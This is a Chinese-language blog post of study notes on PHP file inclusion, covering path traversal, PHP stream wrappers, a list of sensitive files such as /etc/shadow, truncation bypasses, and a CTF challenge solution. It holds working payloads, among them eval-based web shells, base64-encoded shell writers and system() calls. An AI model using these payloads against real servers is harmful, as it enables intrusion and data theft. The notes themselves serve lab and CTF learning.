---
layout: post
title: File Include
subtitle: 文件包含漏洞
date: 2025-06-19 11:55
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: false
---
## 1. 文件包含伪协议

#### 1.1.1. 直接包含

```http
http://pikachu.to/vul/dir/dir_list.php?title=../../../../../../../\windows\system32\drivers\etc\hosts
http://pikachu.to/vul/dir/dir_list.php?title=../../../../../../windows/system32/drivers/etc/hosts
```

#### 1.1.2. file://

用于读取本地文件，必须使用绝对路径，php项目读取php文件时会执行其中代码，导致无法读取到源码。

```php
file:///etc/passwd
file://C:\Windows\System32\drivers\etc\hosts
file:///windows/system32/drivers/etc/hosts
```

#### 1.1.3. php://filter

读取指定资源，可以是本地也可以是远程资源，可指定编码类型对内容编码，在读取php文件时可防止其运行，从而读取源码。

```php
php://filter/ {operation}={filter_chain}/resource={source}
php://filter/read=convert.base64-encode/resource=http://www.baidu.com
php://filter/convert.base64-encode/resource=http://www.baidu.com
php://filter/resource=http://www.baidu.com
php://filter/resource=../index.php

operation: read write
filter-chain: convert.base64-encode convert.base64-decode
```

#### 1.1.4. php://input

用于读取原始的 POST 请求数据

```php
php://input

POST数据：
<?php eval($_POST['cmd']);?>
<?php fputs(fopen('shell.php','w'),'<?php @eval($_REQUEST["cmd"]);?>');?>
```

#### 1.1.5. data://

用于在 URL 中嵌入小块数据

```php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
data://a/b,<?php phpinfo();?>
https://7cdbe539-f220-4021-ac93-fd10996d0f13.challenge.ctf.show
```

#### 1.1.6. zlib://

```php
compress.zlib://shell.php.gz
```

## 2. 敏感文件

```
/etc/shadow(存放密码)
/etc/gshadow(存放密码)
/etc/profile(系统环境)
/etc/group(组的数据库文件)
/etc/my.conf(MYSQL配置信息)
/usr/etc/php.ini(PHP配置信息)
/etc/crontab(crontab配置文件)
/etc/passwd(系统用户数据库文件)
/etc/httpd/conf/httpd.conf(Apache配置信息)
```

## 3. 文件包含绕过

1. %00截断

```
?filename=file:///var/log/httpd/access_log%00
```

1. %23 %00 截断
2. session文件包含
	session文件保存位置：`/var/lib/php/session`，文件名 `sess_phpsessid`

![image.png](https://img.ghostliner.top/MkmNDz.png)
![image.png](https://img.ghostliner.top/ifzPF6.png)

## 4. CTF 实战

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 */
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

代码审计：

- 禁止"php"不能用 `<?php` 可用加密
- 禁止"-"不能用 `php://filter/read=convert.base64-encode`

#### 4.1.1. 方法一

使用`data://a/b;base64,<base64 code>`构造不含"+"的base64编码

_PS. base64末尾等号可直接删除，不影响解码_

```php
<?php
fputs(fopen('shell.php','w'),'<?php phpinfo(); ?>');
?>#1
# base64:
# PD9waHAKZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgcGhwaW5mbygpOyA/PicpOwo/PiMx
```

```php
<?php
fputs(fopen('shell.php','w'),'<?php eval($_POST["code"]);?>');
?>#
# base64:
# PD9waHAKZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbHGNvZGUdXSk7Pz4nKTsKPz4j
```

![image.png](https://img.ghostliner.top/eB1pGC.png)

#### 4.1.2. 方法二

```php
<?php system("ls"); ?>
<?php system("cat fl0g.php"); ?>
```
